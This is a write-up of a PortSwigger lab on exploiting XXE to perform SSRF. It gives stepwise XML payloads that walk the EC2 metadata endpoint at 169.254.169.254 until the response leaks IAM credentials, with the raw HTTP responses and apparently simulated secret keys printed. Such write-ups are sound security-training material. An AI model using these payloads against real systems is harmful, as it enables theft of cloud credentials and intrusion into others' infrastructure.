# Exploiting XXE to perform SSRF attacks

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)

## Definition
Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## Notes
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

**Original XML request**
```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>1</storeId></stockCheck>
```

**XXE Payloads**

*Attempt 1*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [<!ENTITY pwn SYSTEM "http://169.254.169.254">]>
<stockCheck><productId>&pwn;</productId><storeId>1</storeId></stockCheck>
```

*Response*
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 28

"Invalid product ID: latest"
```

*Attempt 2*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [<!ENTITY pwn SYSTEM "http://169.254.169.254/latest">]>
<stockCheck><productId>&pwn;</productId><storeId>1</storeId></stockCheck>
```

*Response*
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 28

"Invalid product ID: meta-data"
```

*Attempt 3*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [<!ENTITY pwn SYSTEM "http://169.254.169.254/latest/meta-data">]>
<stockCheck><productId>&pwn;</productId><storeId>1</storeId></stockCheck>
```

*Response*
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 28

"Invalid product ID: iam"
```

*Final Attempt*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [<!ENTITY pwn SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&pwn;</productId><storeId>1</storeId></stockCheck>
```

*Response*
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2022-05-18T17:36:37.824274741Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ktSvLUrMsAzXPy6xpJ03",
  "SecretAccessKey" : "wwZLlNrB5LA6KpmdwovRnbXE6hqGTpLAwzCRggOy",
  "Token" : "1OVbrB1EHLdCKUWPAVvk1XWIWBqEXr4YiaOHrROrE3lyZeZNvcKtnYXHSdK9odWMIukBnCY8bWVz1UWWImJipCrmSNvYeh5GeCDi41xiKPH2nOP7pPp8MCxcxaQDK73uwAPG3aCviZ8kPJjjkEagNRUwjynCFq6JuCeBKiKcwtedTuNTCIIM60sCwo88exUD8Po6wvvbpcsppP6Gu3ixe4UsGQ9f8OGiuW41j4jbFzfi7B5s9aAAhHYGZ8h63MDK",
  "Expiration" : "2028-05-16T17:36:37.824274741Z"
}"
```

## Key Words
> xml, xxe, ssrf, aws, ec2, secrets